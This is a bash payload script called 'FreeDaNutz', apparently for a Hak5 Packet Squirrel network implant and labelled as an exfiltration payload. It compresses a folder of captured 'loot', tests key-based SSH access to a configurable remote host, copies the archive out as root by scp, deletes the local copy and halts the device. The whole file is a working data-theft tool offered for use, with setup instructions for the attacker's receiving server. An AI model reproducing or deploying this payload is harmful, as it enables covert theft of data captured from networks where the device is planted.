#!/bin/bash
#
# Title:		FreeDaNutz

# Description:		This payload will compress the loot folder and then send that file to a remote server via scp

# Author: 		infoskirmish.com
# Version:		1.0
# Category:		exfiltration
# Target: 		Any
# Net Mode:		NAT

# LEDs
# FAIL:			This payload will LED FAIL (blink RED) for the following reasons
#				No USB storage found
#				Cannot send files to remote host 
#				Cannot ping remote host

# ATTACK:		Setting NAT: Blink Yellow		
#			Compressing: Rapid Cyan
#			Sending: Rapid Magenta
#			Cleaning up: Rapid White

# SUCCESS:		LED goes off

exfilhost="xx.xx.xx.xx"			# The hostname or ip address you want to send the data to.
exfilhostuser="root"			# The username of the account for the above hostname
sshport="22"				# Port to send data out on
exfilfile="backup.tar.gz"		# The name of the compressed loot folder
identityfile="/root/.ssh/id_rsa"	# Path to private identity file on the squirrel
remotepath="/root/$exfilfile"		# Path to filename (include file name) on the remote machine.
exfilfilepath="/mnt/$exfilfile"		# Location to temp store compressed loot (this gets sent)
lootfolderpath="/mnt/loot"		# Path to loot folder
payloadlogpath="/mnt/loot/freedanutz"	# Path to store payload log file


# The main run function.
# Inputs: None
# Returns: None
# Upon success it will call the finish() function to shutdown.
function run() {

	# Create log directory
	# We store the tarball on /mnt outside the /mnt/loot folder in order to make sure we do not use up all the limited space on the device itself. 
	if [ ! -d $payloadlogpath ]; then

		# If log path does not exisit then we should create it.
		mkdir -p $payloadlogpath &> /dev/null
	fi

	# Set networking to NAT mode and wait eight seconds
	NETMODE NAT
	sleep 8

	# If we cannot reach the server we want to send our data to then there is no point in going any further. 
	ping $exfilhost -w 3 &> /dev/null
	pingtest=$?
	if [ $pingtest -ne 0 ]; then
		debugdata
		fail "FATAL ERROR: Cannot reach $exfilhost"
	fi

	# Let's test to make sure scp keys are set up correclty and we can send files before we send loot.
	testssh

	# Start blinking LED Cyan very fast to indicate compressing is in progress. 
	LED C VERYFAST

	# Compress the loot folder
	echo "tar -czf $exfilfilepath $lootfolderpath" >> $payloadlogpath/log.txt
	tar -czf $exfilfilepath $lootfolderpath &> /dev/null

	# Start blinking LED Magenta very fast to indicate sending is in progress. 
	LED M VERYFAST

	# Send compress file out into the world.
	echo "scp -P $sshport -C -i $identityfile $exfilfilepath $exfilhostuser@$exfilhost:$remotepath" >> $payloadlogpath/log.txt
	scp -P $sshport -C -i $identityfile $exfilfilepath $exfilhostuser@$exfilhost:$remotepath &> /dev/null

	# Clean up
	finish
}



# A function to clean up files and safely shutdown
# Inputs: None
# Returns: None
function finish() {
	
	# Remove the file we have sent out as it is no longer needed and just taking up space.
	echo "Removing $exfilfilepath" >> $payloadlogpath/log.txt
	rm $exfilfilepath
	sync

	# Halt the system; turn off LED
	LED OFF
	halt
}



# A function to test if the payload can send files to the remote host.
# Inputs: None
# Returns: None
# On test fail will abort script.
function testssh() {

	# Create test file.
	touch $exfilfilepath.test
	scp -P $sshport -C -i $identityfile $exfilfilepath.test $exfilhostuser@$exfilhost:$remotepath &> /dev/null
	error=$?

	if [ $error -ne 0 ]; then

		# We could not send test file; this is a fatal error.
		rm $exfilfilepath.test
		debugdata
		fail "FATAL ERROR: Could not access and/or login to $exfilhostuser@$exfilhost remove path = $remotepath"

	else
		# Be nice and try to remove the test file we uploaded.
		ssh $exfilhostuser@$exfilhost 'rm $remotepath.test'
		rm $exfilfilepath.test		
	fi

}



# A function to standardize how fatal errors fail.
# Inputs: $1:Error message
# Returns: None
# This will abort the script.
function fail() {
	
	LED FAIL
	echo $1 >> $payloadlogpath/log.txt
	sync		
	halt

}



# A function to dump data to aid in trouble shooting problems.
# Inputs: None
# Returns: None
function debugdata() {

	echo "=== DEBUG DATA ===" >> $payloadlogpath/log.txt
	ifconfig >> $payloadlogpath/log.txt
	echo "=== Scp Command ===" >> $payloadlogpath/log.txt
	echo "scp -P $sshport -C -i $identityfile $exfilfilepath $exfilhostuser@$exfilhost:$remotepath" >> $payloadlogpath/log.txt
	echo "=== Tar Command ===" >> $payloadlogpath/log.txt
	echo "tar -czf $exfilfilepath $lootfolderpath &> /dev/null" >> $payloadlogpath/log.txt
	echo "=== Public Key Dump ===" >> $payloadlogpath/log.txt
	cat $identityfile.pub >> $payloadlogpath/log.txt
	echo "=== Network Config Dump ===" >> $payloadlogpath/log.txt
	cat /etc/config/network >> $payloadlogpath/log.txt
	echo "=== Ping $exfilhost Results ===" >> $payloadlogpath/log.txt
	echo "If there is no data it likely means that $exfilhost is a bad address." >> $payloadlogpath/log.txt
	ping $exfilhost -w 3 >> $payloadlogpath/log.txt
	echo "=== lsusb Dump ===" >> $payloadlogpath/log.txt
	lsusb >> $payloadlogpath/log.txt
}



# Zero out payload log file.
echo "" > $payloadlogpath/log.txt

# This payload will only run if we have USB storage
if [ -d "/mnt/loot" ]; then

	# Check to see if the .ssh folder exists. If it does not exist then create it.
	if [ ! -d "/root/.ssh" ]; then

		# If it doesn't then we need to create it.
		echo "Warning: /root/.ssh folder did not exits. We created it." >> $payloadlogpath/log.txt
		mkdir -p /root/.ssh &> /dev/null

	fi

	# Check if identity file exists. If not create it. 
	if [ ! -f $identityfile ]; then

		# We need to log a warning that since the identify file was not found then this payload likely will fail. This payload will give the user a likely way to fix this problem.
		echo "Warning: We had to create $identityfile" >> $payloadlogpath/log.txt
		echo "To complete setup you'll likely need to run this command on the squirrel (make sure when you do your squirrel can access $exfilhost)" >> $payloadlogpath/log.txt
		echo "cat $identityfile.pub | ssh $exfilhostuser@$exfilhost 'cat >> .ssh/authorized_keys'" >> $payloadlogpath/log.txt
		ssh-keygen -t rsa -N "" -f $identityfile
	fi
	
	LED ATTACK
	run
else

	# USB storage could not be found; log it in ~/payload/switch1/log.txt
	payloadlogpath="log.txt"
	debugdata
	fail "Could not load USB storage. Stopping..."

fi
